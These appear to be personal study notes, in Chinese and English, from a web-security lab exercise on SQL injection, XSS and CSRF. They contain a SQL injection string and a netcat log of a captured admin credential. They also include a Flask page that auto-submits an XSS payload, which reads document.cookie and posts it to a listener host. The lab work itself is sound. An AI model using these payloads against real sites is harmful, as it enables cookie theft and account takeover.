# sql注入
' OR 1=1 --
# Same origin:
scheme,host,port
# curl 进行路径解析的时候会把../自动略去，注意使用url encode

# url 注入技巧
%0A换行符

# XSS：chrome访问阻止 一些端口 如 6666等，1337不会触发
# 复杂请求 + 跨域 才会触发options
hacker@web-security~xss-7:~$ nc -lv localhost 1338
Listening on localhost 1338
Connection received on localhost 36852
GET /?auth=admin|.QXygTN2wiM2cjMyEzW} HTTP/1.1
Host: localhost:1338
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Referer: http://challenge.localhost/
Origin: http://challenge.localhost
Connection: keep-alive
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site
Priority: u=4d
# XSS vs crsf
XSS 直接在网站中注入scirpt
crsf 导航到我们的网站的一些脚本
# csrf越过SOP （同源保护）
flask.redirect
img不行
form 自动提交也可以

form here:
<script>document.forms[0].submit</script>

# CSRF +XSS 示例：
```py
from flask import Flask, request
import flask

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        print("Got POST:", request.form)
        return "Received."

    import requests
    from urllib.parse import quote

    payload = """<form id='f' action='http://localhost:1338' method='POST'>
    <input type='hidden' name='cookie' id='c'>
    </form><script>document.getElementById('c').value=document.cookie;document.getElementById('f').submit()</script>"""
    encoded_payload = payload
    # encoded_payload = quote(payload)
    # encoded_payload="hellO!"
    url = f"http://challenge.localhost/ephemeral?msg={encoded_payload}"

    return f"""
    <!DOCTYPE html>
    <html>
    <body>
        <h1>Welcome to my site!</h1>
        <form method="GET" action="{url}">
            <input type="hidden" name="msg" value="{encoded_payload}">
        </form>
        <script>
            setTimeout(() => document.forms[0].submit(), 500);
        </script>
    </body>
    </html>
"""

if __name__ == '__main__':
    app.run(host='hacker.localhost', port=1337, debug=True)

```
要点：
注意get 只会提交内部已有字段，与 url无关
另外：
不要quote，否则XSS 内嵌失败
# fetch 中 mode 的作用
no-cors:
https://www.google.com/search?q=fetch+mode%3Ano-cors&oq=fetch+mode%3Ano-cors&gs_lcrp=EgZjaHJvbWUyBggAEEUYOdIBCDMzMzNqMGo0qAIAsAIB&sourceid=chrome&ie=UTF-8
限制预检，为了安全限制正文的出现，以及限制方法在一个范围。
